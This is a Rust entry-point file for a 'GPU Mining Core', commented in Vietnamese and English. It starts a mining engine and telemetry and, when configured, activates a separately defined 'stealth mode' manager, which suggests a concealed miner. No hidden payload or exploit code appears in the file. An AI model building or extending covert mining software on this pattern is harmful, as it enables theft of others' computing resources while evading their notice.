// GPU Mining Core - Điểm vào chính
// Main entry point cho hệ thống mining GPU

use anyhow::Result;
use tracing::{error, info, warn};
use tokio::signal;
use std::sync::Arc;

mod config;
mod core;
mod stealth;
mod mining;
mod monitoring;
mod networking;

use config::Config;
use core::MiningEngine;
use stealth::StealthManager;
use monitoring::TelemetrySystem;

/// Cấu trúc ứng dụng chính
/// Main application structure
struct Application {
    /// Cấu hình hệ thống (system configuration)
    config: Arc<Config>,
    /// Engine khai thác chính (main mining engine)
    engine: MiningEngine,
    /// Quản lý stealth mode (stealth mode manager)
    stealth: StealthManager,
    /// Hệ thống telemetry (telemetry system)
    telemetry: TelemetrySystem,
}

impl Application {
    /// Khởi tạo ứng dụng mới
    /// Initialize new application instance
    async fn new() -> Result<Self> {
        // Tải cấu hình từ file hoặc biến môi trường
        // Load configuration from file or environment
        let config = Arc::new(Config::load()?);
        
        // Khởi tạo hệ thống logging/tracing
        // Initialize logging/tracing system
        tracing_subscriber::fmt()
            .with_env_filter(config.log_level.as_str())
            .init();
        
        info!("🚀 Khởi động GPU Mining Core v{}", env!("CARGO_PKG_VERSION"));
        
        // Khởi tạo các thành phần chính
        // Initialize main components
        let engine = MiningEngine::new(config.clone()).await?;
        let stealth = StealthManager::new(config.clone())?;
        let telemetry = TelemetrySystem::new(config.clone())?;
        
        Ok(Self {
            config,
            engine,
            stealth,
            telemetry,
        })
    }
    
    /// Chạy vòng lặp chính của ứng dụng
    /// Run main application loop
    async fn run(&mut self) -> Result<()> {
        info!("🔧 Thiết lập môi trường mining...");
        
        // Kích hoạt stealth mode nếu được cấu hình
        // Activate stealth mode if configured
        if self.config.stealth_enabled {
            info!("🥷 Kích hoạt stealth mode...");
            self.stealth.activate()?;
        }
        
        // Bắt đầu monitoring
        // Start monitoring
        self.telemetry.start().await?;
        
        // Khởi động engine mining
        // Start mining engine
        info!("⛏️ Bắt đầu khai thác GPU...");
        self.engine.start().await?;
        
        // Chờ tín hiệu shutdown
        // Wait for shutdown signal
        self.wait_for_shutdown().await?;
        
        // Cleanup
        self.shutdown().await?;
        
        Ok(())
    }
    
    /// Chờ tín hiệu shutdown (SIGTERM/SIGINT)
    /// Wait for shutdown signal
    async fn wait_for_shutdown(&self) -> Result<()> {
        let ctrl_c = async {
            signal::ctrl_c()
                .await
                .expect("Failed to install Ctrl+C handler");
        };

        #[cfg(unix)]
        let terminate = async {
            signal::unix::signal(signal::unix::SignalKind::terminate())
                .expect("Failed to install signal handler")
                .recv()
                .await;
        };

        #[cfg(not(unix))]
        let terminate = std::future::pending::<()>();

        tokio::select! {
            _ = ctrl_c => {
                info!("📛 Nhận tín hiệu Ctrl+C, đang shutdown...");
            },
            _ = terminate => {
                info!("📛 Nhận tín hiệu SIGTERM, đang shutdown...");
            },
        }

        Ok(())
    }
    
    /// Thực hiện shutdown sạch sẽ
    /// Perform clean shutdown
    async fn shutdown(&mut self) -> Result<()> {
        info!("🔄 Đang thực hiện graceful shutdown...");
        
        // Dừng mining engine
        // Stop mining engine
        self.engine.stop().await?;
        
        // Dừng telemetry
        // Stop telemetry
        self.telemetry.stop().await?;
        
        // Cleanup stealth mode
        if self.config.stealth_enabled {
            self.stealth.deactivate()?;
        }
        
        info!("✅ Shutdown hoàn tất");
        Ok(())
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    // Xử lý panic một cách an toàn
    // Handle panics safely
    std::panic::set_hook(Box::new(|panic_info| {
        error!("⚠️ PANIC: {}", panic_info);
    }));
    
    // Khởi tạo và chạy ứng dụng
    // Initialize and run application
    match Application::new().await {
        Ok(mut app) => {
            if let Err(e) = app.run().await {
                error!("❌ Lỗi runtime: {}", e);
                std::process::exit(1);
            }
        }
        Err(e) => {
            error!("❌ Lỗi khởi tạo: {}", e);
            std::process::exit(1);
        }
    }
    
    Ok(())
}
